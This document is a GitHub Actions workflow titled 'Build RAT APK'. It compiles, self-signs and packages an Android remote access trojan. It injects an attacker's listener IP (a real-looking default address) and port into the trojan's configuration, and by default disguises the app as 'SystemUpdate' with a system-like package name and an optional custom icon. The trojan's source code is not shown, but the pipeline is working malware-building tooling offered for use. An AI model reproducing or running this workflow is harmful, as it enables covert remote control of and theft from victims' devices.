name: Build RAT APK

on:
  workflow_dispatch:
    inputs:
      lhost:
        description: 'Listener IP Address'
        required: true
        default: '34.58.145.84'
      lport:
        description: 'Listener Port'
        required: true
        default: '5555'
      app_name:
        description: 'Application Name'
        required: true
        default: 'SystemUpdate'
      package_name:
        description: 'Package Name (e.g., com.android.update)'
        required: true
        default: 'com.android.system.update'
      icon_data:
        description: 'Custom Icon Base64 Data (optional)'
        required: false
        default: ''
      icon_extension:
        description: 'Icon File Extension (png/jpg)'
        required: false
        default: 'png'

jobs:
  build:
    runs-on: ubuntu-latest
    
    steps:
    - name: Checkout repository
      uses: actions/checkout@v4

    - name: Set up JDK 17
      uses: actions/setup-java@v4
      with:
        java-version: '17'
        distribution: 'temurin'

    - name: Setup Android SDK
      run: |
        wget https://dl.google.com/android/repository/commandlinetools-linux-9477386_latest.zip
        unzip commandlinetools-linux-9477386_latest.zip
        mkdir -p $ANDROID_HOME/cmdline-tools
        mv cmdline-tools $ANDROID_HOME/cmdline-tools/latest
        export PATH=$PATH:$ANDROID_HOME/cmdline-tools/latest/bin
        yes | sdkmanager --licenses
        sdkmanager "platform-tools" "platforms;android-33" "build-tools;33.0.0"

    - name: Update Configuration with Listener Details
      run: |
        # Update Constants.java with LHOST and LPORT
        sed -i "s/SERVER_IP = \".*\"/SERVER_IP = \"${{ github.event.inputs.lhost }}\"/" app/src/main/java/com/fly0rakoon/rat/utils/Constants.java
        sed -i "s/SERVER_PORT = .*/SERVER_PORT = ${{ github.event.inputs.lport }};/" app/src/main/java/com/fly0rakoon/rat/utils/Constants.java

        # Update app name and package name
        sed -i "s/android:label=\".*\"/android:label=\"${{ github.event.inputs.app_name }}\"/" app/src/main/AndroidManifest.xml
        sed -i "s/package=\".*\"/package=\"${{ github.event.inputs.package_name }}\"/" app/src/main/AndroidManifest.xml

    # 👇 INSERT THE CUSTOM ICON STEP HERE 👇
    - name: Handle Custom Icon
      if: ${{ github.event.inputs.icon_data != '' }}
      run: |
        echo "🎨 Processing custom icon..."
        
        # Create necessary resource directories
        mkdir -p app/src/main/res/drawable
        mkdir -p app/src/main/res/mipmap-hdpi
        mkdir -p app/src/main/res/mipmap-mdpi
        mkdir -p app/src/main/res/mipmap-xhdpi
        mkdir -p app/src/main/res/mipmap-xxhdpi
        mkdir -p app/src/main/res/mipmap-xxxhdpi
        
        # Decode base64 icon
        ICON_DATA="${{ github.event.inputs.icon_data }}"
        
        # Remove data URL prefix if present
        if [[ $ICON_DATA == data:image/* ]]; then
          ICON_DATA=$(echo $ICON_DATA | sed 's/^data:image\/[a-zA-Z0-9]*;base64,//')
          echo "✅ Extracted base64 from data URL"
        fi
        
        # Save raw decoded data to temp file
        echo "$ICON_DATA" | base64 -d > /tmp/raw_icon.dat
        
        # Check file size and type
        RAW_SIZE=$(wc -c < /tmp/raw_icon.dat)
        echo "📊 Raw decoded size: $RAW_SIZE bytes"
        
        # Verify it's actually an image using file command
        if command -v file &> /dev/null; then
          FILE_TYPE=$(file -b /tmp/raw_icon.dat)
          echo "🔍 Detected file type: $FILE_TYPE"
          
          # Check if it's a valid image
          if [[ $FILE_TYPE == *PNG* ]] || [[ $FILE_TYPE == *JPEG* ]] || [[ $FILE_TYPE == *GIF* ]] || [[ $FILE_TYPE == *BMP* ]]; then
            echo "✅ Valid image format detected"
          else
            echo "⚠️ Unrecognized image format, but continuing..."
          fi
        fi
        
        # Try to convert to proper PNG using different methods
        # Method 1: Use ImageMagick if available
        if command -v convert &> /dev/null; then
          echo "🖼️ Using ImageMagick to convert to PNG..."
          convert /tmp/raw_icon.dat -resize 192x192 /tmp/icon_converted.png
          if [ $? -eq 0 ]; then
            echo "✅ ImageMagick conversion successful"
            cp /tmp/icon_converted.png /tmp/final_icon.png
          else
            echo "⚠️ ImageMagick conversion failed, trying fallback"
            cp /tmp/raw_icon.dat /tmp/final_icon.png
          fi
        else
          # Method 2: Just use the raw data
          echo "📦 Using raw image data (ImageMagick not available)"
          cp /tmp/raw_icon.dat /tmp/final_icon.png
        fi
        
        # Verify the final PNG file
        if [ -f /tmp/final_icon.png ]; then
          FINAL_SIZE=$(wc -c < /tmp/final_icon.png)
          echo "📊 Final icon size: $FINAL_SIZE bytes"
          
          # Check if it's a valid PNG by looking for PNG header
          if hexdump -n 8 -C /tmp/final_icon.png 2>/dev/null | grep -q "PNG"; then
            echo "✅ Valid PNG header detected"
          else
            echo "⚠️ PNG header not found, but continuing..."
            # Show first few bytes for debugging
            echo "🔍 First 16 bytes of icon:"
            hexdump -n 16 -C /tmp/final_icon.png 2>/dev/null || echo "  Unable to read file"
          fi
        else
          echo "❌ Failed to create icon file"
          exit 1
        fi
        
        # Copy to all resource directories
        echo "📁 Copying icon to resource directories..."
        
        # Copy to drawable
        cp /tmp/final_icon.png app/src/main/res/drawable/ic_launcher.png
        
        # Copy to all mipmap folders
        cp /tmp/final_icon.png app/src/main/res/mipmap-hdpi/ic_launcher.png
        cp /tmp/final_icon.png app/src/main/res/mipmap-mdpi/ic_launcher.png
        cp /tmp/final_icon.png app/src/main/res/mipmap-xhdpi/ic_launcher.png
        cp /tmp/final_icon.png app/src/main/res/mipmap-xxhdpi/ic_launcher.png
        cp /tmp/final_icon.png app/src/main/res/mipmap-xxxhdpi/ic_launcher.png
        
        # Copy round icons
        cp /tmp/final_icon.png app/src/main/res/mipmap-hdpi/ic_launcher_round.png
        cp /tmp/final_icon.png app/src/main/res/mipmap-mdpi/ic_launcher_round.png
        cp /tmp/final_icon.png app/src/main/res/mipmap-xhdpi/ic_launcher_round.png
        cp /tmp/final_icon.png app/src/main/res/mipmap-xxhdpi/ic_launcher_round.png
        cp /tmp/final_icon.png app/src/main/res/mipmap-xxxhdpi/ic_launcher_round.png
        
        # Clean up temp files
        rm -f /tmp/raw_icon.dat /tmp/icon_converted.png /tmp/final_icon.png
        
        # Final verification
        echo "✅ Icon files installed:"
        ls -la app/src/main/res/mipmap-hdpi/ic_launcher.png
        
        # Verify AndroidManifest.xml has correct icon references
        if grep -q "android:icon=\"@mipmap/ic_launcher\"" app/src/main/AndroidManifest.xml; then
          echo "✅ AndroidManifest.xml has correct icon references"
        else
          echo "⚠️ Adding icon references to AndroidManifest.xml"
          sed -i 's|<application|& android:icon="@mipmap/ic_launcher" android:roundIcon="@mipmap/ic_launcher_round"|' app/src/main/AndroidManifest.xml
        fi

    - name: Build APK
      run: |
        chmod +x gradlew
        ./gradlew assembleRelease --no-daemon

    - name: Sign APK
      run: |
        # Generate keystore for signing
        keytool -genkey -v -keystore release.keystore -alias ratkey -keyalg RSA -keysize 2048 -validity 10000 -storepass 123456 -keypass 123456 -dname "CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown"

        # First, align the APK (zipalign must be done BEFORE signing)
        $ANDROID_HOME/build-tools/33.0.0/zipalign -v -p 4 app/build/outputs/apk/release/app-release-unsigned.apk app/build/outputs/apk/release/app-release-aligned.apk

        # Sign the APK with apksigner
        $ANDROID_HOME/build-tools/33.0.0/apksigner sign --ks release.keystore --ks-pass pass:123456 --key-pass pass:123456 --out app/build/outputs/apk/release/app-release-signed.apk app/build/outputs/apk/release/app-release-aligned.apk

        # Verify the signature
        $ANDROID_HOME/build-tools/33.0.0/apksigner verify --verbose app/build/outputs/apk/release/app-release-signed.apk

        # Copy to final name with app_name and lhost
        cp app/build/outputs/apk/release/app-release-signed.apk ${{ github.event.inputs.app_name }}_${{ github.event.inputs.lhost }}.apk

    - name: Upload APK Artifact
      uses: actions/upload-artifact@v4
      with:
        name: rat-apk
        path: ${{ github.event.inputs.app_name }}_${{ github.event.inputs.lhost }}.apk
        retention-days: 1
        if-no-files-found: error
